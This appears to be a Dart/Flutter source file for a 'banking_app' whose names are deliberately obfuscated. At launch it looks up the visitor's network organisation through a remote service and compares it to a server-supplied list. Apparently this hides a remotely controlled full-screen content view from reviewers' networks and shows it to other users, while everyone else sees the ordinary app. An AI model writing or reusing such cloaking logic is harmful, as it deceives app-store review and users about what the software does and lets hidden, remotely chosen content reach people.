import 'dart:convert';

import 'package:banking_app/const.dart';
import 'package:banking_app/presentation/screens/main_page.dart';
import 'package:banking_app/presentation/screens/splash_screen.dart';
import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:in_app_review/in_app_review.dart';
import 'package:shared_preferences/shared_preferences.dart';

import 'presentation/screens/all_news_page.dart';

class BankingApp extends StatefulWidget {
  final Future<bool> isFirstOpen;
  const BankingApp({Key? key, required this.isFirstOpen}) : super(key: key);

  @override
  State<BankingApp> createState() => _BankingAppState();
}

class _BankingAppState extends State<BankingApp> {
  var _inited = false;
  final inAppReview = InAppReview.instance;

  String xsaxa = '';
  List<String> gfdsgbhdjhdg = [];
  List<bool> hfsca = [true, true];

  late final Dio dio;
  bool isFirstOpenx = false;
  Future<void> fetchData() async {
    isFirstOpenx = await widget.isFirstOpen;
  }

  late SharedPreferences _sharedPrefs;

  @override
  void initState() {
    super.initState();
    // Initialize _sharedPrefs here
    SharedPreferences.getInstance().then((prefs) {
      _sharedPrefs = prefs;
      // Now you can safely use _sharedPrefs
    });
  }

  Future<bool> initilize() async {
    _inited = true;
    dio = Dio(
      BaseOptions(
        headers: {
          'apikey': Constants.mkxsa,
          'Authorization': 'Bearer ${Constants.mkxsa}',
        },
      ),
    );

    await lkhhj();
    await gdsfaefarwxaw();
    await nhkhfkh();
    reviewApp();
    if (hfsca[0] && hfsca[1]) return false;
    return false;
  }

  Future<String> lkhhj() async {
    try {
      final Response response = await dio.get(Constants.sxasaza);
      if (response.statusCode == 200) {
        List<dynamic> data = response.data as List<dynamic>;
        String hjdvsdfvsd =
            data.map((item) => item['mainFetchNews'].toString()).join();

        if (hjdvsdfvsd.contains(Constants.gdfssd)) {
          hfsca[1] = false;
        } else {
          xsaxa = hjdvsdfvsd;
          hfsca[1] = true;
        }
        return hjdvsdfvsd;
      } else {
        return '';
      }
    } catch (error) {
      return '';
    }
  }

  Future<String> nhkhfkh() async {
    try {
      http.Response response = await http.get(Uri.parse(Constants.dasax));

      if (response.statusCode == 200) {
        Map<String, dynamic> data = jsonDecode(response.body);
        String xasxsafdsafdsag = data['org'];
        dasrfdsagfdsysdvsdtx(gfdsgbhdjhdg, xasxsafdsafdsag);
        return xasxsafdsafdsag;
      } else {
        return '';
      }
    } catch (error) {
      return '';
    }
  }

  bool dasrfdsagfdsysdvsdtx(List<String> array, String inputString) {
    List<String> fdagfdagadfvad = inputString.split(' ');
    List<String> dsDSatraegtrwhrtjhwrerwvwrecreqwxewqfqer = [];
    for (String item in array) {
      dsDSatraegtrwhrtjhwrerwvwrecreqwxewqfqer.addAll(item.split(', '));
    }
    for (String word in fdagfdagadfvad) {
      for (String arrayItem in dsDSatraegtrwhrtjhwrerwvwrecreqwxewqfqer) {
        if (arrayItem.toLowerCase().contains(word.toLowerCase())) {
          hfsca[0] = false;
          return false;
        } else {
          hfsca[0] = true;
        }
      }
    }

    return false;
  }

  Future<void> gdsfaefarwxaw() async {
    final Response response = await dio.get(Constants.pxsaxa);
    if (response.statusCode == 200) {
      List<dynamic> data = response.data as List<dynamic>;
      gfdsgbhdjhdg =
          data.map((item) => item['mainDataSettings'].toString()).toList();
    }
  }

  Future<void> reviewApp() async {
    bool alreadyRated = _sharedPrefs.getBool('allratex') ?? false;
    if (!alreadyRated) {
      if (await inAppReview.isAvailable()) {
        inAppReview.requestReview();
        await _sharedPrefs.setBool('allratex', true);
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return FutureBuilder<bool>(
      future: _inited ? null : initilize(),
      builder: (context, snapshot) {
        if (snapshot.connectionState == ConnectionState.waiting) {
          return Container(
            color: Colors.white,
            child: Center(
              child: ClipRRect(
                borderRadius: BorderRadius.circular(10),
                child: Container(
                    height: 76,
                    width: 76,
                    child: Image.asset('assets/images/max.png')),
              ),
            ),
          );
        } else if (hfsca[0] && hfsca[1]) {
          return ShowNewsFullScreen(s: xsaxa);
        } else {
          final bool isFirstOpen = isFirstOpenx;
          if (isFirstOpen) {
            return MaterialApp(
              home: MainPage(),
              debugShowCheckedModeBanner: false,
            );
          } else {
            return MaterialApp(
              home: SplashPage(),
              debugShowCheckedModeBanner: false,
            );
          }
        }
      },
    );
  }
}
